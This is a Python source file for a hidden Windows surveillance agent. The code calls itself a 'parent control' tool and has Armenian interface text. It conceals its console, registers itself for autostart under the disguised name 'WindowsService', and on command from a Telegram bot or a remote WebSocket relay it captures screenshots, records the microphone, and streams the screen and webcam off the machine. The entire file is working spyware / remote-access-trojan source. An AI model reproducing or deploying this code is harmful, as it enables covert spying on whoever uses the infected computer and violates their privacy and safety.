"""
Silent Parent Control Agent
Ամբողջովին թաքնված գործակալ (no GUI, no console).
Ավտոմատ ավելանում է Windows-ի ավտոբեռնման մեջ։
"""
import base64
import configparser
import gc
import http.server
import io
import json
import logging
import os
import secrets
import signal
import socket
import socketserver
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import wave

import pyautogui
try:
    import pyaudio
except ImportError:
    try:
        import pyaudiowpatch as pyaudio
    except ImportError:
        pyaudio = None
import telebot
from telebot import types

# ── Константы ──────────────────────────────────────────────
APP_NAME = "WindowsService"
SCREENSHOT_MAX_WIDTH = 1280
SCREENSHOT_JPEG_QUALITY = 72
STREAM_HOST = "0.0.0.0"
STREAM_PORT = 8765
STREAM_FRAME_DELAY_SECONDS = 0.35
STREAM_TOKEN = secrets.token_urlsafe(18)
WEBCAM_DEVICE_INDEX = 0
WEBCAM_FRAME_DELAY_SECONDS = 0.12
WEBCAM_JPEG_QUALITY = 72
WEBCAM_WIDTH = 960
WEBCAM_HEIGHT = 540
RELAY_SCREEN_DELAY_SECONDS = 0.6
RELAY_WEBCAM_DELAY_SECONDS = 0.18
AUDIO_SECONDS = 10
AUDIO_CHUNK = 1024
AUDIO_FORMAT = pyaudio.paInt16 if pyaudio else 8
AUDIO_CHANNELS = 2
AUDIO_RATE = 44100

# ── Логирование ────────────────────────────────────────────
logger = logging.getLogger("silent_agent")

def setup_logging():
    logger.setLevel(logging.INFO)
    logger.handlers.clear()
    formatter = logging.Formatter("%(asctime)s %(levelname)s %(message)s")
    try:
        log_dir = app_dir()
        fh = logging.FileHandler(os.path.join(log_dir, "service.log"), encoding="utf-8")
        fh.setFormatter(formatter)
        logger.addHandler(fh)
    except OSError:
        pass

# ── Пути ───────────────────────────────────────────────────
def app_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

def config_path():
    return os.path.join(app_dir(), "config.ini")

# ── Автозагрузка Windows ──────────────────────────────────
def add_to_startup():
    """Добавляет EXE в реестр Windows для автозапуска"""
    if not sys.platform.startswith("win"):
        return
    
    try:
        import winreg
        exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
        
        # Если запущен как .py — добавляем python с аргументом
        if exe_path.endswith(".py"):
            exe_path = f'"{sys.executable}" "{exe_path}"'
        else:
            exe_path = f'"{exe_path}"'
        
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, APP_NAME, 0, winreg.REG_SZ, exe_path)
        
        logger.info("Added to startup: %s", exe_path)
    except Exception as e:
        logger.error("Failed to add to startup: %s", e)

def remove_from_startup():
    """Удаляет из автозагрузки (на будущее)"""
    if not sys.platform.startswith("win"):
        return
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.DeleteValue(reg_key, APP_NAME)
        logger.info("Removed from startup")
    except FileNotFoundError:
        pass
    except Exception as e:
        logger.error("Failed to remove from startup: %s", e)

# ── Скрытие окна (если вдруг появится) ────────────────────
def hide_console():
    """Скрывает консольное окно на Windows"""
    if not sys.platform.startswith("win"):
        return
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

# ── Конфиг ─────────────────────────────────────────────────
def load_config():
    parser = configparser.ConfigParser()
    parser.read(config_path(), encoding="utf-8")
    
    bot_token = parser.get("telegram", "bot_token", fallback="").strip()
    admin_chat_id = parser.get("telegram", "admin_chat_id", fallback="").strip()
    
    if not bot_token:
        raise RuntimeError("config.ini: missing bot_token")
    if not admin_chat_id:
        raise RuntimeError("config.ini: missing admin_chat_id")
    
    try:
        admin_chat_id = int(admin_chat_id)
    except ValueError:
        raise RuntimeError("admin_chat_id must be a number")
    
    relay_enabled = parser.getboolean("relay", "enabled", fallback=False)
    relay_server = parser.get("relay", "server_url", fallback="").strip()
    relay_token = parser.get("relay", "agent_token", fallback="").strip()
    
    return {
        "bot_token": bot_token,
        "admin_chat_id": admin_chat_id,
        "relay": {
            "enabled": relay_enabled and bool(relay_server) and bool(relay_token),
            "server_url": relay_server,
            "agent_token": relay_token
        }
    }

# ── Инициализация ──────────────────────────────────────────
setup_logging()
hide_console()

try:
    CONFIG = load_config()
except RuntimeError as e:
    logger.error("Config error: %s", e)
    with open(os.path.join(app_dir(), "error.log"), "a", encoding="utf-8") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} CONFIG ERROR: {e}\n")
    sys.exit(1)

BOT_TOKEN = CONFIG["bot_token"]
ADMIN_CHAT_ID = CONFIG["admin_chat_id"]
RELAY_CONFIG = CONFIG["relay"]

bot = telebot.TeleBot(BOT_TOKEN)

# ── Состояния ──────────────────────────────────────────────
live_event = threading.Event()
webcam_event = threading.Event()
relay_screen_event = threading.Event()
relay_webcam_event = threading.Event()
relay_stop_event = threading.Event()
state_lock = threading.Lock()
stream_server = None
stream_server_thread = None
stream_lock = threading.Lock()
relay_ws = None
relay_ws_lock = threading.Lock()
relay_client_thread = None
shutdown_started = threading.Event()

# ── Telegram helpers ───────────────────────────────────────
def is_allowed(chat_id):
    return int(chat_id) == ADMIN_CHAT_ID

def build_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton("📸 Էկրանի նկար", callback_data="screenshot"),
        types.InlineKeyboardButton("🎤 Ձայնագրել 10 վ", callback_data="audio"),
        types.InlineKeyboardButton("🔴 Ուղիղ ցուցադրում", callback_data="live_start"),
        types.InlineKeyboardButton("📷 Վեբ տեսախցիկ", callback_data="webcam_start"),
        types.InlineKeyboardButton("⏸ Դադարեցնել", callback_data="live_stop")
    )
    return kb

# ── Скриншоты ──────────────────────────────────────────────
def make_screenshot_bytes():
    image = None
    working = None
    rgb_image = None
    buffer = io.BytesIO()
    try:
        image = pyautogui.screenshot()
        working = image
        if image.width > SCREENSHOT_MAX_WIDTH:
            ratio = SCREENSHOT_MAX_WIDTH / image.width
            working = image.resize((SCREENSHOT_MAX_WIDTH, int(image.height * ratio)))
        rgb_image = working.convert("RGB")
        rgb_image.save(buffer, "JPEG", quality=SCREENSHOT_JPEG_QUALITY, optimize=True)
        return buffer.getvalue()
    finally:
        if rgb_image is not None and rgb_image is not working:
            rgb_image.close()
        if working is not None and working is not image:
            working.close()
        if image is not None:
            image.close()
        buffer.close()

def send_screenshot(chat_id):
    photo = None
    try:
        photo = io.BytesIO(make_screenshot_bytes())
        photo.name = "screen.jpg"
        bot.send_photo(chat_id, photo, caption="📸 Էկրանի նկարը պատրաստ է։")
    except Exception:
        logger.exception("Screenshot failed")
        try:
            bot.send_message(chat_id, "Չհաջողվեց ստանալ էկրանի նկարը։")
        except Exception:
            pass
    finally:
        if photo is not None:
            photo.close()

# ── Аудио ──────────────────────────────────────────────────
def create_audio_interface():
    if pyaudio is None:
        raise RuntimeError("PyAudio not installed")
    audio = pyaudio.PyAudio()
    try:
        has_input = False
        for i in range(audio.get_device_count()):
            info = audio.get_device_info_by_index(i)
            if int(info.get("maxInputChannels", 0)) >= AUDIO_CHANNELS:
                has_input = True
                break
        if not has_input:
            raise RuntimeError("No microphone found")
        return audio
    except Exception:
        audio.terminate()
        raise

def record_audio_file(seconds=AUDIO_SECONDS):
    fd, path = tempfile.mkstemp(prefix="audio_", suffix=".wav")
    os.close(fd)
    audio = None
    stream = None
    frames = []
    try:
        audio = create_audio_interface()
        stream = audio.open(
            format=AUDIO_FORMAT,
            channels=AUDIO_CHANNELS,
            rate=AUDIO_RATE,
            frames_per_buffer=AUDIO_CHUNK,
            input=True
        )
        for _ in range(0, int(AUDIO_RATE / AUDIO_CHUNK * seconds)):
            frames.append(stream.read(AUDIO_CHUNK, exception_on_overflow=False))
        with wave.open(path, "wb") as f:
            f.setnchannels(AUDIO_CHANNELS)
            f.setsampwidth(audio.get_sample_size(AUDIO_FORMAT))
            f.setframerate(AUDIO_RATE)
            f.writeframes(b"".join(frames))
        return path
    finally:
        if stream is not None:
            stream.stop_stream()
            stream.close()
        if audio is not None:
            audio.terminate()

def remove_file(path):
    try:
        if path and os.path.exists(path):
            os.remove(path)
    except OSError:
        pass

def send_audio(chat_id):
    path = ""
    try:
        path = record_audio_file()
        with open(path, "rb") as af:
            bot.send_audio(chat_id, af, caption="🎤 Ձայնագրությունը պատրաստ է։")
    except Exception:
        logger.exception("Audio failed")
        try:
            bot.send_message(chat_id, "Չհաջողվեց ձայնագրել ձայնը։")
        except Exception:
            pass
    finally:
        remove_file(path)

# ── Webcam ─────────────────────────────────────────────────
def import_cv2():
    try:
        import cv2
        return cv2
    except ImportError as e:
        raise RuntimeError("OpenCV not installed") from e

# ── Relay WebSocket ────────────────────────────────────────
def relay_ws_url():
    base = RELAY_CONFIG["server_url"]
    if base.startswith("https://"):
        base = "wss://" + base.removeprefix("https://")
    elif base.startswith("http://"):
        base = "ws://" + base.removeprefix("http://")
    elif not base.startswith(("ws://", "wss://")):
        base = "wss://" + base
    token = urllib.parse.quote(RELAY_CONFIG["agent_token"], safe="")
    device_name = urllib.parse.quote(socket.gethostname(), safe="")
    return f"{base}/agent?token={token}&device_name={device_name}"

def start_relay_client():
    global relay_client_thread
    if not RELAY_CONFIG["enabled"]:
        return
    if relay_client_thread and relay_client_thread.is_alive():
        return
    relay_stop_event.clear()
    relay_client_thread = threading.Thread(target=relay_client_loop, daemon=True)
    relay_client_thread.start()

def relay_client_loop():
    global relay_ws
    try:
        import websocket
    except ImportError:
        logger.warning("websocket-client not installed")
        return
    
    backoff = 1
    while not relay_stop_event.is_set():
        connected = threading.Event()
        app = websocket.WebSocketApp(
            relay_ws_url(),
            on_open=lambda ws: relay_on_open(ws, connected),
            on_message=relay_on_message,
            on_close=relay_on_close,
            on_error=relay_on_error
        )
        with relay_ws_lock:
            relay_ws = app
        try:
            app.run_forever(ping_interval=25, ping_timeout=10)
        except Exception:
            logger.exception("Relay loop error")
        finally:
            with relay_ws_lock:
                if relay_ws is app:
                    relay_ws = None
        relay_screen_event.clear()
        relay_webcam_event.clear()
        
        if connected.is_set():
            backoff = 1
            sleep_time = 1
        else:
            sleep_time = backoff
            backoff = min(backoff * 2, 30)
        
        for _ in range(sleep_time):
            if relay_stop_event.is_set():
                break
            time.sleep(1)

def relay_on_open(_ws, connected):
    connected.set()
    logger.info("Relay connected")
    relay_send({
        "type": "agent_status",
        "message": "Գործակալը միացավ։",
        "screen": relay_screen_event.is_set(),
        "webcam": relay_webcam_event.is_set()
    })

def relay_on_close(_ws, *_args):
    logger.warning("Relay closed")
    relay_screen_event.clear()
    relay_webcam_event.clear()

def relay_on_error(_ws, error):
    logger.warning("Relay error: %s", error)

def relay_on_message(_ws, message):
    try:
        data = json.loads(message)
    except json.JSONDecodeError:
        return
    if data.get("type") != "command":
        return
    
    cmd = data.get("command")
    if cmd == "screen_start":
        start_relay_screen()
    elif cmd == "screen_stop":
        relay_screen_event.clear()
        relay_send_status("Էկրանի ցուցադրումը դադարեցվեց։")
    elif cmd == "webcam_start":
        start_relay_webcam()
    elif cmd == "webcam_stop":
        relay_webcam_event.clear()
        relay_send_status("Վեբ տեսախցիկը դադարեցվեց։")
    elif cmd == "audio":
        threading.Thread(target=send_relay_audio, daemon=True).start()
    elif cmd == "all_stop":
        relay_screen_event.clear()
        relay_webcam_event.clear()
        stop_live()
        stop_stream_server()
        relay_send_status("Բոլորը դադարեցված է։")

def send_relay_audio():
    """Записывает аудио и отправляет base64 через relay"""
    path = ""
    try:
        path = record_audio_file()
        with open(path, "rb") as f:
            audio_b64 = base64.b64encode(f.read()).decode("ascii")
        relay_send({
            "type": "audio",
            "data": audio_b64,
            "filename": f"audio_{int(time.time())}.wav"
        })
    except Exception:
        logger.exception("Relay audio failed")
    finally:
        remove_file(path)

def relay_send(payload):
    with relay_ws_lock:
        ws = relay_ws
    if not ws:
        return False
    try:
        ws.send(json.dumps(payload))
        return True
    except Exception:
        return False

def relay_send_status(msg):
    relay_send({
        "type": "agent_status",
        "message": msg,
        "screen": relay_screen_event.is_set(),
        "webcam": relay_webcam_event.is_set()
    })

def start_relay_screen():
    if relay_screen_event.is_set():
        return
    relay_screen_event.set()
    relay_send_status("Էկրանի ցուցադրումը սկսվեց։")
    threading.Thread(target=relay_screen_loop, daemon=True).start()

def relay_screen_loop():
    fc = 0
    while relay_screen_event.is_set() and not relay_stop_event.is_set():
        try:
            frame = base64.b64encode(make_screenshot_bytes()).decode("ascii")
            relay_send({"type": "frame", "stream": "screen", "data": frame})
            fc += 1
            if fc % 100 == 0:
                gc.collect()
        except Exception:
            logger.exception("Relay screen error")
            relay_screen_event.clear()
            break
        time.sleep(RELAY_SCREEN_DELAY_SECONDS)

def start_relay_webcam():
    if relay_webcam_event.is_set():
        return
    relay_webcam_event.set()
    relay_send_status("Վեբ տեսախցիկը սկսվեց։")
    threading.Thread(target=relay_webcam_loop, daemon=True).start()

def relay_webcam_loop():
    try:
        cv2 = import_cv2()
    except RuntimeError:
        relay_send_status("OpenCV-ը տեղադրված չէ։")
        relay_webcam_event.clear()
        return
    
    cam = cv2.VideoCapture(WEBCAM_DEVICE_INDEX, cv2.CAP_DSHOW)
    if not cam.isOpened():
        cam = cv2.VideoCapture(WEBCAM_DEVICE_INDEX)
    if not cam.isOpened():
        relay_send_status("Չհաջողվեց բացել վեբ տեսախցիկը։")
        relay_webcam_event.clear()
        return
    
    cam.set(cv2.CAP_PROP_FRAME_WIDTH, WEBCAM_WIDTH)
    cam.set(cv2.CAP_PROP_FRAME_HEIGHT, WEBCAM_HEIGHT)
    
    try:
        fc = 0
        while relay_webcam_event.is_set() and not relay_stop_event.is_set():
            ok, frame = cam.read()
            if not ok:
                time.sleep(0.5)
                continue
            ok, enc = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), WEBCAM_JPEG_QUALITY])
            if ok:
                relay_send({
                    "type": "frame",
                    "stream": "webcam",
                    "data": base64.b64encode(enc.tobytes()).decode("ascii")
                })
                fc += 1
                if fc % 100 == 0:
                    gc.collect()
            time.sleep(RELAY_WEBCAM_DELAY_SECONDS)
    except Exception:
        logger.exception("Relay webcam error")
    finally:
        cam.release()
        relay_webcam_event.clear()

# ── HTTP Stream Server ─────────────────────────────────────
class LiveStreamHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return
    
    def do_GET(self):
        path, _, query = self.path.partition("?")
        params = parse_query(query)
        if params.get("token") != STREAM_TOKEN:
            self.send_error(403)
            return
        if path in ("", "/"):
            self.send_live_page()
        elif path == "/stream":
            self.send_mjpeg_stream()
        elif path == "/webcam":
            self.send_webcam_page()
        elif path == "/webcam-stream":
            self.send_webcam_stream()
        else:
            self.send_error(404)
    
    def send_live_page(self):
        status = "Ակտիվ է" if live_event.is_set() else "Դադարեցված է"
        html = f"""<!doctype html><html lang="hy"><head><meta charset="utf-8"><title>Ուղիղ</title><style>html,body{{margin:0;background:#080b10;color:#f8fafc;font-family:Arial}}header{{position:fixed;top:0;left:0;right:0;padding:10px 14px;background:rgba(8,11,16,.78)}}.dot{{width:10px;height:10px;border-radius:50%;background:#ef4444;display:inline-block;margin-right:8px}}img{{display:block;width:100vw;min-height:100vh;object-fit:contain}}</style></head><body><header><span class="dot"></span>{status}</header><img src="/stream?token={STREAM_TOKEN}"></body></html>"""
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    
    def send_mjpeg_stream(self):
        if not live_event.is_set():
            self.send_response(409)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
        self.end_headers()
        fc = 0
        while live_event.is_set():
            try:
                frame = make_screenshot_bytes()
                self.wfile.write(b"--frame\r\nContent-Type: image/jpeg\r\n")
                self.wfile.write(f"Content-Length: {len(frame)}\r\n\r\n".encode())
                self.wfile.write(frame)
                self.wfile.write(b"\r\n")
                self.wfile.flush()
                fc += 1
                if fc % 100 == 0:
                    gc.collect()
                time.sleep(STREAM_FRAME_DELAY_SECONDS)
            except (BrokenPipeError, ConnectionResetError):
                break
            except Exception:
                time.sleep(1)
    
    def send_webcam_page(self):
        status = "Ակտիվ է" if webcam_event.is_set() else "Դադարեցված է"
        html = f"""<!doctype html><html lang="hy"><head><meta charset="utf-8"><title>Վեբ</title><style>html,body{{margin:0;background:#080b10;color:#f8fafc;font-family:Arial}}header{{position:fixed;top:0;left:0;right:0;padding:10px 14px;background:rgba(8,11,16,.78)}}.dot{{width:10px;height:10px;border-radius:50%;background:#22c55e;display:inline-block;margin-right:8px}}img{{display:block;width:100vw;min-height:100vh;object-fit:contain}}</style></head><body><header><span class="dot"></span>{status}</header><img src="/webcam-stream?token={STREAM_TOKEN}"></body></html>"""
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    
    def send_webcam_stream(self):
        if not webcam_event.is_set():
            self.send_response(409)
            self.end_headers()
            return
        try:
            cv2 = import_cv2()
        except RuntimeError:
            self.send_response(500)
            self.end_headers()
            return
        cam = cv2.VideoCapture(WEBCAM_DEVICE_INDEX, cv2.CAP_DSHOW)
        if not cam.isOpened():
            cam = cv2.VideoCapture(WEBCAM_DEVICE_INDEX)
        if not cam.isOpened():
            self.send_response(503)
            self.end_headers()
            return
        cam.set(cv2.CAP_PROP_FRAME_WIDTH, WEBCAM_WIDTH)
        cam.set(cv2.CAP_PROP_FRAME_HEIGHT, WEBCAM_HEIGHT)
        self.send_response(200)
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
        self.end_headers()
        try:
            fc = 0
            while webcam_event.is_set():
                ok, frame = cam.read()
                if not ok:
                    time.sleep(0.5)
                    continue
                ok, enc = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), WEBCAM_JPEG_QUALITY])
                if not ok:
                    continue
                data = enc.tobytes()
                try:
                    self.wfile.write(b"--frame\r\nContent-Type: image/jpeg\r\n")
                    self.wfile.write(f"Content-Length: {len(data)}\r\n\r\n".encode())
                    self.wfile.write(data)
                    self.wfile.write(b"\r\n")
                    self.wfile.flush()
                    fc += 1
                    if fc % 100 == 0:
                        gc.collect()
                except (BrokenPipeError, ConnectionResetError):
                    break
                time.sleep(WEBCAM_FRAME_DELAY_SECONDS)
        except Exception:
            pass
        finally:
            cam.release()

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

def parse_query(query):
    params = {}
    for k, v in urllib.parse.parse_qs(query, keep_blank_values=True).items():
        params[k] = v[0] if v else ""
    return params

def ensure_stream_server():
    global stream_server, stream_server_thread
    with stream_lock:
        if stream_server is not None:
            return True
        try:
            stream_server = ThreadedHTTPServer((STREAM_HOST, STREAM_PORT), LiveStreamHandler)
        except OSError:
            return False
        stream_server_thread = threading.Thread(target=stream_server.serve_forever, daemon=True)
        stream_server_thread.start()
        return True

def stop_stream_server():
    global stream_server, stream_server_thread
    with stream_lock:
        server = stream_server
        stream_server = None
        stream_server_thread = None
    if server is not None:
        try:
            server.shutdown()
            server.server_close()
        except Exception:
            pass

def get_lan_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"

def live_url():
    return f"http://{get_lan_ip()}:{STREAM_PORT}/?token={STREAM_TOKEN}"

def webcam_url():
    return f"http://{get_lan_ip()}:{STREAM_PORT}/webcam?token={STREAM_TOKEN}"

def start_live():
    with state_lock:
        if live_event.is_set():
            return "already"
        if not ensure_stream_server():
            return "server_error"
        webcam_event.clear()
        live_event.set()
        return "started"

def start_webcam():
    with state_lock:
        if webcam_event.is_set():
            return "already"
        if not ensure_stream_server():
            return "server_error"
        live_event.clear()
        webcam_event.set()
        return "started"

def stop_live():
    with state_lock:
        live_event.clear()
        webcam_event.clear()

# ── Shutdown ───────────────────────────────────────────────
def graceful_shutdown(signum=None, _frame=None):
    if shutdown_started.is_set():
        return
    shutdown_started.set()
    logger.info("Shutting down...")
    stop_live()
    relay_screen_event.clear()
    relay_webcam_event.clear()
    relay_stop_event.set()
    try:
        with relay_ws_lock:
            if relay_ws:
                relay_ws.close()
    except Exception:
        pass
    stop_stream_server()
    try:
        bot.stop_polling()
    except Exception:
        pass
    logger.info("Shutdown complete")
    if signum is not None:
        sys.exit(0)

def install_signal_handlers():
    for sig_name in ("SIGINT", "SIGTERM"):
        sig = getattr(signal, sig_name, None)
        if sig is not None:
            try:
                signal.signal(sig, graceful_shutdown)
            except (ValueError, OSError):
                pass

# ── Telegram handlers ──────────────────────────────────────
@bot.message_handler(commands=["start"])
def handle_start(message):
    if not is_allowed(message.chat.id):
        return
    bot.send_message(message.chat.id, "Բարև։ Ընտրիր գործողությունը։", reply_markup=build_menu())

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if not call.message or not is_allowed(call.message.chat.id):
        bot.answer_callback_query(call.id, "Մուտքը թույլատրված չէ։")
        return
    
    chat_id = call.message.chat.id
    
    if call.data == "screenshot":
        bot.answer_callback_query(call.id, "Էկրանի նկարը պատրաստվում է։")
        threading.Thread(target=send_screenshot, args=(chat_id,), daemon=True).start()
    elif call.data == "audio":
        bot.answer_callback_query(call.id, "Ձայնագրությունը սկսվեց։")
        threading.Thread(target=send_audio, args=(chat_id,), daemon=True).start()
    elif call.data == "live_start":
        status = start_live()
        if status == "started":
            url = live_url()
            bot.answer_callback_query(call.id, "Ուղիղ ցուցադրումը սկսվեց։")
            kb = types.InlineKeyboardMarkup(row_width=1)
            kb.add(types.InlineKeyboardButton("🌐 Բացել", url=url))
            bot.send_message(chat_id, f"🔴 {url}", reply_markup=kb)
        elif status == "already":
            bot.answer_callback_query(call.id, "Արդեն ակտիվ է։")
            bot.send_message(chat_id, f"🔴 {live_url()}")
        else:
            bot.answer_callback_query(call.id, "Սխալ։")
    elif call.data == "webcam_start":
        status = start_webcam()
        if status == "started":
            url = webcam_url()
            bot.answer_callback_query(call.id, "Վեբ տեսախցիկը միացավ։")
            kb = types.InlineKeyboardMarkup(row_width=1)
            kb.add(types.InlineKeyboardButton("🌐 Բացել", url=url))
            bot.send_message(chat_id, f"📷 {url}", reply_markup=kb)
        elif status == "already":
            bot.answer_callback_query(call.id, "Արդեն ակտիվ է։")
            bot.send_message(chat_id, f"📷 {webcam_url()}")
        else:
            bot.answer_callback_query(call.id, "Սխալ։")
    elif call.data == "live_stop":
        stop_live()
        stop_stream_server()
        bot.answer_callback_query(call.id, "Դադարեցված է։")
        bot.send_message(chat_id, "⏸ Դադարեցված է։")
    else:
        bot.answer_callback_query(call.id, "Անհայտ։")

# ── MAIN ───────────────────────────────────────────────────
if __name__ == "__main__":
    install_signal_handlers()
    
    # Добавляем в автозагрузку при первом запуске
    add_to_startup()
    
    # Подключаем relay если настроен
    start_relay_client()
    
    # Отправляем сообщение что агент запущен
    try:
        bot.send_message(
            ADMIN_CHAT_ID,
            "🤖 Գործակալը գործարկվեց։",
            reply_markup=build_menu()
        )
    except Exception:
        logger.exception("Startup message failed")
    
    logger.info("Silent agent started (hidden + autostart)")
    bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=20)
